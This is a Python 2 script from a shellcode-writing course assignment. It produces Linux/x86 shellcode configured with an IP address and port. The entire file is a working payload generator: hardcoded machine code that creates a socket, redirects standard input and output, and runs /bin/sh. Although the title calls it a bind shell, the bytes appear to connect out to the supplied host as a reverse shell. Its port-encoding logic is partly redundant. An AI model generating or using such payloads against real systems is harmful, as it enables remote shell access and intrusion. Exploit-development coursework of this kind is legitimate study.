# SLAE - Assignment #1: BindShell (Linux/x86) Wrapper
# Author:  Matteo Malvica (@matteomalvica)
# Website:  http://www.matteomalvica.com
 
import sys

def rethex(n):
    h1 = hex(int(n))[2:]
    
    if len(h1) == 3:
        h1 = "0" + h1
 
    if len(h1) >= 3:
        t1 = h1[0:2]
        t2 = h1[2:4]
        h1 = "\\x" + t1 + "\\x" + t2
 
    if len(h1) < 4 and len(h1) > 2:
        h1 = "0" + h1
    if len(h1) < 2:
        h1="\\x0" + h1
    if len(h1) == 2:
        h1="\\x" + h1
    if h1 == "\\x00":
        print "Oops, looks like the final shellcode contains a \\x00 :(!\r\n"
        sys.exit()
    return h1   

total = len(sys.argv)
if total != 3:
    print "[+] Usage %s [ip] [tcp ort]" % sys.argv[0]
    sys.exit()

else:
    try:
        ip = sys.argv[1]
        addr = ""
        for i in range(0,4):
            addr = addr + rethex(ip.split(".",3)[i])            

        port = int(sys.argv[2])
        if port > 65535:
            print "Cannot bind a port greater than 65535!"
            sys.exit()
        if port < 1024:
            print "Port is smaller than 1024! Need to be root for that"
            sys.exit()      
        # convert integer argv port to hex and stuff with leading zeroes if port hex length is < 4
        hexport = hex(port)[2:].zfill(4)    
        # split hexport in two parts to check for null byte
        b1 = hexport[0:2]
        b2 = hexport[2:4] 
    
        if b1 == "00" or b2 == "00":
            print "Port contains \\x00!"
            exit()
    
        # add leading zero if nibble-only value
        if len(b1) < 2:
            b1="\\x0" + b1
        if len(b1) == 2:
            b1="\\x" + b1
        if len(b2) < 2:
            b2="\\x0" + b2
        if len(b2) == 2:
            b2="\\x" + b2
    
        shellport=b1+b2

        shellport = rethex(port)
    
        print "Shellcode-ready address:\t" + addr 
        print "Shellcode-ready port:\t\t" + shellport 
 
        shellcode = bytearray("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2"
            "\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x06\\x6a\\x01\\x6a"
            "\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x31"
            "\\xdb\\xb3\\x02\\x68" +addr+ "\\x66\\x68" +shellport+  
            "\\x66\\x53\\xfe\\xc3\\x89\\xe1\\x6a\\x10"
            "\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x02"
            "\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x75\\xf8\\x31\\xc0"
            "\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62"
            "\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\x52\\x89\\xe2"
            "\\xb0\\x0b\\xcd\\x80")
 
        print "Final shellcode:\t\n" + shellcode + "\""
        print "Shellocde length is:\t\t" + str(len(shellcode)/4) + "\n"
 
    except:
        print "exiting..."
